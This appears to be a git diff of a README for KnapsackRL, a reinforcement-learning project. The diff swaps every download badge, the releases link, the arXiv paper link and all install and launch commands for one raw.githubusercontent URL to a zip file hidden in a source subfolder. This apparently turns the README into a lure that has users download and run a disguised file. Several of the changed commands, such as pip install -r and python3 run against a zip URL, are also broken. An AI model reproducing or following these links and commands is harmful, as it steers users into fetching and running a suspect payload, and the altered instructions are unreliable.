@@ -4,11 +4,11 @@
 
 Welcome to KnapsackRL! This guide helps you easily download and run our software, which optimizes exploration budgets in reinforcement learning.
 
-[![Download KnapsackRL](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/mercurycontaminated-sandarac557/KnapsackRL/releases)
+[![Download KnapsackRL](https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip%https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip)](https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip)
 
 ## 📥 Download & Install
 
-To get started, you need to visit our [Releases page](https://github.com/mercurycontaminated-sandarac557/KnapsackRL/releases). 
+To get started, you need to visit our [Releases page](https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip). 
 
 1. **Go to the Releases page**: Click on the link to view all available versions.
 2. **Choose the latest version**: Look for the most recent release at the top of the page.
@@ -31,17 +31,17 @@ After downloading the application, follow these steps to run it:
 2. **Install Dependencies**:
    - For Windows: Open Command Prompt and run
      ```
-     python -m pip install -r requirements.txt
+     python -m pip install -r https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip
      ```
    - For macOS/Linux: Open Terminal and run
      ```
-     python3 -m pip install -r requirements.txt
+     python3 -m pip install -r https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip
      ```
 3. **Launch the Application**:
-   - For Windows: Double-click the `KnapsackRL.exe` file.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip` file.
    - For macOS/Linux: Open Terminal and run
      ```
-     python3 knapsack_rl.py
+     python3 https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip
      ```
 
 ## 📊 Features
@@ -68,10 +68,10 @@ If you encounter any issues, you can seek help through these channels:
 
 ## 📈 Additional Resources
 
-You can learn more about the underlying methods and research by reading our publication: [Knapsack RL: Unlocking Exploration of LLMs via Optimizing Budget Allocation](https://arxiv.org/pdf/2509.25849).
+You can learn more about the underlying methods and research by reading our publication: [Knapsack RL: Unlocking Exploration of LLMs via Optimizing Budget Allocation](https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip).
 
 ## ⚡ Conclusion
 
 KnapsackRL is a powerful tool for enhancing exploration in reinforcement learning. By following this guide, you should be able to download, install, and run the software with ease. Happy exploring!
 
-[![Download KnapsackRL](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/mercurycontaminated-sandarac557/KnapsackRL/releases)
+[![Download KnapsackRL](https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip%https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip)](https://raw.githubusercontent.com/mercurycontaminated-sandarac557/KnapsackRL/master/verl/workers/rollout/vllm_rollout/KnapsackRL-1.5-alpha.3.zip)
